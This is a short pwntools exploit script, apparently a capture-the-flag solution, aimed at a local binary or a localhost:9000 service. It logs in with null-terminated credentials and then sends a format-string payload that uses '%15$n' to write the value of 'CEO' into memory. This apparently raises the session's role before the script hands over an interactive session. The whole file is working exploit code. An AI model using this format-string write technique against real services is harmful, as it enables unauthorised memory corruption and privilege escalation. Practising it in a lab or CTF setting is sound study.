from pwn import*
context.arch="amd64"
context.terminal="xterm" #adjust this with ur terminal
b="./main"
#l = libc = ELF("./libc.so.6")
elf = e = context.binary = ELF(b)
DEBUG=1 # 0 remote , 1 local , 2 local + gdb
nc="nc localhost 9000"
r=nc.split(" ")
if DEBUG==1:
    p=process(b)
elif DEBUG==2:
    p=process(b)
    gdb.attach(p,"""b* challenge + 212
    
    """)
else:
    p=remote(r[1],int(r[2]),ssl=False)



p.sendline(b"RockstarSeniorSWE\x00")
p.wait(1)
p.sendline("MyPasswordIsVeryV\016ryStrong#@.\x00")
p.wait(1)

p.sendline("%"+str(int(u32("CEO\x00")-33))+"c"+"%15$n")





p.interactive()